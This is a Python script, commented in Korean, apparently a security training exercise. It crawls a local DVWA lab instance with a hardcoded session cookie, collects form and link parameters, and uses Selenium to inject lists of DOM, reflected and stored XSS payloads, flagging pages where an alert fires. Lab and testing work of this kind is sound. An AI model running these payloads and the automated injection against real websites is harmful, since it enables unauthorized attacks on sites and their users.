# vulnweb에서 확인이 필요한 태그 및 속성
# form 태그 : action 속성, method 속성
# a 태그 : href 속성
# input 태그 : onClick 속성("location.href='~~~'")
"""
tmp_dic = {
    'url' : 'http://localhost/vulnweb/boardWrite.php',
    'method' : 'post',
    'param' : ['subject', 'author', 'date', 'content']
}
"""

from bs4 import BeautifulSoup
import requests


check_key = ['url', 'method', 'param'] # tmp_dic에 모든 키가 존재하는지 확인하기 위함

find_path_list = []
find_path_dic = []

##########################################################################################################################
# form 태그에서 경로를 찾는 함수
def findPathForm():
    try:
        for location in soup.select('form'):
            
            action = location['action'] # 링크 확인
            
            # action 값을 find_path_list에 추가
            if 'http' not in action:
                action = f'http://192.168.100.180/DVWA/{action}'
                
            if action not in find_path_list:
                url = deny_url_check(action)
                if url == 0:
                    continue
                find_path_list.append(url)
                
    except Exception as e:
        print(f"findPathForm_ERROR : {e}")
            
##########################################################################################################################
# a 태그에서 경로를 찾는 함수
def findPathA():
    try:
        for location in soup.select('a'):
            href = location['href']
            
            if 'http' not in href:
                href = f'http://192.168.100.180/DVWA/{href}'

            if href not in find_path_list:
                url = deny_url_check(href)
                if url == 0:
                    continue
                find_path_list.append(url)
            
                
    except Exception as e:
        print(f"findPathA_ERROR : {e}")

##########################################################################################################################
# input 태그에서 경로를 찾는 함수
def findPathInput():
    try:
        for location in soup.select('input'):
            if 'onclick' in location.attrs:
                onclick = location['onclick']
                a = onclick.split("'")
                b = onclick.split('"')
                if 'location.href=' in a or 'location.href = ' in a:
                    if 'http' not in a[1]:
                        url = f'http://192.168.100.180/DVWA/{a[1]}'
                    else:
                        url = a[1]
                    
                    if url not in find_path_list:
                        url = deny_url_check(url)
                        if url == 0:
                            continue
                        find_path_list.append(url)
                        
                elif 'location.href=' in b or 'location.href = ' in b:
                    if 'http' not in b[1]:
                        url = f'http://192.168.100.180/DVWA/{b[1]}'
                    else:
                        url = b[1]
                        
                    if url not in find_path_list:
                        url = deny_url_check(url)
                        if url == 0:
                            continue
                        find_path_list.append(url)
                        
    except Exception as e:
        print(f"findPathInput_ERROR : {e}")

##########################################################################################################################

def deny_url_check(url):
    cnt = 0
    deny_url_list = [
                        'http://192.168.100.180/DVWA/logout.php', 
                        'http://192.168.100.180/DVWA/instructions.php', 
                        'http://192.168.100.180/DVWA/setup.php', 
                        'http://192.168.100.180/DVWA/vulnerabilities/captcha/',
                        'http://192.168.100.180/DVWA/#',
                        'http://192.168.100.180/DVWA/.',
                        'http://192.168.100.180/DVWA/security.php',
                        'http://192.168.100.180/DVWA/phpinfo.php',
                        'http://192.168.100.180/DVWA/about.php',
                        'https://www.virtualbox.org/',
                        'https://www.vmware.com/',
                        'https://www.apachefriends.org/',
                        'https://github.com/webpwnized/mutillidae',
                        'https://owasp.org/www-project-vulnerable-web-applications-directory',
                        'http://192.168.100.180/DVWA/vulnerabilities/api/',
                        'http://192.168.100.180/DVWA/vulnerabilities/cryptography/',
                        'http://192.168.100.180/DVWA/vulnerabilities/authbypass/',
                        'http://192.168.100.180/DVWA/vulnerabilities/open_redirect/',
                        'http://192.168.100.180/DVWA/vulnerabilities/weak_id/',
                        'http://192.168.100.180/DVWA/vulnerabilities/csp/',
                        'http://192.168.100.180/DVWA/vulnerabilities/javascript/'
                     ]
    for deny_url in deny_url_list:
        if url != deny_url:
            cnt += 1
    
    if cnt == len(deny_url_list):
        return url
    else:
        return 0

##########################################################################################################################

def get_param_check(href):
    param_name = []
    # tmp_dic = {}
    if '?' in href:
        method = 'get'
        a = href.split("?")
        if '&' in a[1]:
            param = a[1].split("&")
            for data in param:
                name = data.split('=')
                param_name.append(name[0])
        else:
            param = a[1]
            name = param.split('=')
            param_name.append(name[0])
        return method, param_name
    
    return '?', '?'
print(len(find_path_list))
print(find_path_dic)
##########################################################################################################################
# [*] 최초 탐색
# => 처음에는 index.php에서 먼저 탐색을 해야함. 
# => 처음에 http://localhost/vulnweb 을 입력하면 로그인이 필요하기 때문에 정상 작동 안됨
# => 따라서 먼저 로그인하여 해당 쿠키값을 통해 로그인을 확인 후 최초 탐색에서 얻은 결과를 통해 반복탐색에서 탐색을 이어나간다.
url = "http://192.168.100.180/DVWA/"
headers = {
    'Cookie':'PHPSESSID=6a3805228d9e07695f457efff64f411e; security=low'
}
res = requests.get(url, headers=headers)
soup = BeautifulSoup(res.text, "html.parser")

findPathForm()
findPathA()
findPathInput()

print(f"\nURL 탐색 결과 : {find_path_list}")
print("END")
##########################################################################################################################
# [*] 반복 탐색
# => 최초 탐색에서 얻은 경로를 통해 모든 경로를 탐색한다.
# => find_path_list에는 최초에 2개의 URL만 들어있지만 경로탐색함수를 호출 시 찾은 경로를 다시 find_path_list에 저장하기 때문에
# => 한번 탐색을 할 때마다 find_path_list의 양이 늘어나고 리스트에 들어있는 모든 경로를 탐색할 때까지 반복한다.
# => 최종적으로는 find_path_dic 딕셔너리에 url, method, param의 값이 저장되고, 이 값을 통해 공격 페이로드를 삽입한다.
def findParam():
    for location in soup.select('form'):
        tmp_dic = {}
        param_list = []
        
        method = location['method']
        if 'method' in location.attrs:
            tmp_dic['url'] = url
            tmp_dic['method'] = method
            for input_data in soup.select('input'):
                if 'name' in input_data.attrs:
                    param_list.append(input_data['name'])
            for input_data in soup.select('textarea'):
                if 'name' in input_data.attrs:
                    param_list.append(input_data['name'])
            for input_data in soup.select('select'):
                if 'name' in input_data.attrs:
                    param_list.append(input_data['name'])
        tmp_dic['param'] = param_list
        
        if all(key in tmp_dic for key in check_key):
            if tmp_dic in find_path_dic:
                continue
            elif tmp_dic['param'] == '?' or tmp_dic['method'] == '?':
                continue
            else:
                find_path_dic.append(tmp_dic)
    
    for location in soup.select('a'):
        tmp_dic = {}
        method, param_name = get_param_check(url)
        tmp_dic['url'] = url
        tmp_dic['method'] = method
        tmp_dic['param'] = param_name
        
        if all(key in tmp_dic for key in check_key):
            if tmp_dic in find_path_dic:
                continue
            elif tmp_dic['param'] == '?' or tmp_dic['method'] == '?':
                continue
            else:
                find_path_dic.append(tmp_dic)


for url in find_path_list:
    headers = {
    'Cookie':'PHPSESSID=6a3805228d9e07695f457efff64f411e; security=low'
    }
    res = requests.get(url, headers=headers)
    soup = BeautifulSoup(res.text, "html.parser")
    
    findParam()
##########################################################################################################################
print()
print("[웹사이트 경로 크롤링]")
index = 1
for url in find_path_list:
    print(f"{index} : {url}")
    index += 1
##########################################################################################################################
print()
print("[각 경로 별 파라미터]")
index = 1
for item in find_path_dic:
    print(f"{index} : {item}")
    index += 1

##########################################################################################################################

# # ------------------ 09_xss_d.py ------------------

import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.common.exceptions import UnexpectedAlertPresentException, NoAlertPresentException
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

xss_payloads_d = [
    '<script>alert("DOM XSS 1")</script>',
    '<img src=x onerror=alert("DOM XSS 2")>',
    '<svg/onload=alert("DOM XSS 3")>',
    '\"><script>alert("DOM XSS 4")</script>',
    "';alert('DOM XSS 5');//"
]

param_dic_d = next((item for item in find_path_dic if "xss_d" in item['url']), None)
if param_dic_d:
    base_url_d = param_dic_d['url']
    param_name_d = param_dic_d['param'][0]
    print("# ------------------ 9_xss_d.py ------------------")
    driver = webdriver.Safari()
    driver.set_page_load_timeout(10)
    driver.get("http://192.168.100.180/DVWA/")
    driver.delete_all_cookies()
    for c in [{'name': 'PHPSESSID', 'value': '6a3805228d9e07695f457efff64f411e'}, {'name': 'security', 'value': 'low'}]:
        driver.add_cookie(c)

    vuln_d = []
    for payload in xss_payloads_d:
        test_url = f"{base_url_d}?{param_name_d}={payload}"
        print(f"[*] 테스트 중: {test_url}")
        try:
            driver.get(test_url)
            time.sleep(1)
            try:
                WebDriverWait(driver, 3).until(EC.alert_is_present())
                alert = driver.switch_to.alert
                print(f"[+] DOM XSS 감지됨! payload: {payload}")
                print(f"    ↳ alert 내용: {alert.text}")
                alert.accept()
                vuln_d.append(test_url)
            except NoAlertPresentException:
                print(f"[-] alert 없음: {test_url}")
        except UnexpectedAlertPresentException:
            alert = driver.switch_to.alert
            print(f"[+] 예외적 alert 발생: {test_url}")
            print(f"    ↳ alert 내용: {alert.text}")
            alert.accept()
            vuln_d.append(test_url)
        except Exception as e:
            print(f"[!] 기타 오류 발생: {e} :: {test_url}")
    if vuln_d:
        print(f"\n[!] {len(vuln_d)}건의 DOM XSS 감지:")
        for url in vuln_d:
            print(f"   - {url}")
    else:
        print("[+] DOM XSS 취약점 없음.")

# ------------------ 10_xss_r.py ------------------

xss_payloads_r = [
    '<script>alert("XSS성공1")</script>',
    '<img src=x onerror=alert("XSS성공2")>',
    '<svg/onload=alert("XSS성공3")>',
    "';alert('XSS성공4');//",
    '\"><script>alert(\"XSS\")</script>',
    '<img+src=x+onerror="alert(\'XSS성공!!!(High)\')">',
    "<img src=x onerror=alert('XSS성공(High)')>"
]

param_dic_r = next((item for item in find_path_dic if "xss_r" in item['url']), None)
if param_dic_r:
    base_url_r = param_dic_r['url']
    param_name_r = param_dic_r['param'][0]
    print("# ------------------ 10_xss_r.py ------------------")
    vuln_r = []
    for payload in xss_payloads_r:
        test_url = f"{base_url_r}?{param_name_r}={payload}"
        print(f"[*] 테스트 중: {test_url}")
        try:
            driver.get(test_url)
            time.sleep(1)
            try:
                WebDriverWait(driver, 3).until(EC.alert_is_present())
                alert = driver.switch_to.alert
                print(f"[+] XSS 감지됨! payload: {payload}")
                print(f"    ↳ alert 내용: {alert.text}")
                alert.accept()
                vuln_r.append(test_url)
            except NoAlertPresentException:
                print(f"[-] alert 없음: {test_url}")
        except UnexpectedAlertPresentException:
            alert = driver.switch_to.alert
            print(f"[+] 예외적 alert 발생: {test_url}")
            print(f"    ↳ alert 내용: {alert.text}")
            alert.accept()
            vuln_r.append(test_url)
        except Exception as e:
            print(f"[!] 기타 오류 발생: {e} :: {test_url}")
    if vuln_r:
        print(f"\n[!] {len(vuln_r)}건의 Reflected XSS 감지:")
        for url in vuln_r:
            print(f"   - {url}")
    else:
        print("[+] Reflected XSS 취약점 없음.")

# ------------------ 11_xss_s.py ------------------

xss_payloads_s = [
    '<script>alert("XSS1")</script>',
    '<img src=x onerror=alert("XSS2")>',
    '<svg/onload=alert("XSS3")>'
]

param_dic_s = next((item for item in find_path_dic if "xss_s" in item['url']), None)
if param_dic_s:
    base_url_s = param_dic_s['url']
    input_name = "txtName"
    message = "mtxMessage"
    submit = "btnSign"
    print("# ------------------ 11_xss_s.py ------------------")
    vuln_s = []
    for payload in xss_payloads_s:
        print(f"[*] 테스트 중: {payload}")
        try:
            driver.get(base_url_s)
            time.sleep(1)
            driver.execute_script(f'document.querySelector("input[name=\'{input_name}\']").setAttribute("maxlength", "100");')
            driver.find_element(By.NAME, input_name).clear()
            driver.find_element(By.NAME, input_name).send_keys("Test")
            driver.find_element(By.NAME, message).clear()
            driver.find_element(By.NAME, message).send_keys(payload)
            driver.find_element(By.NAME, submit).click()
            time.sleep(0.5)
            driver.get(base_url_s)
            WebDriverWait(driver, 3).until(EC.alert_is_present())
            alert = driver.switch_to.alert
            print(f"[+] Stored XSS 감지됨! payload: {payload}")
            print(f"    ↳ alert 내용: {alert.text}")
            alert.accept()
            vuln_s.append(payload)
        except Exception:
            print(f"[-] alert 없음 또는 실패: {payload}")
    if vuln_s:
        print(f"\n[!] {len(vuln_s)}건의 Stored XSS 감지:")
        for p in vuln_s:
            print(f"   - {p}")
    else:
        print("[+] Stored XSS 취약점 없음.")

    driver.quit()
    input("\n[*] Enter 키를 누르면 프로그램 종료")
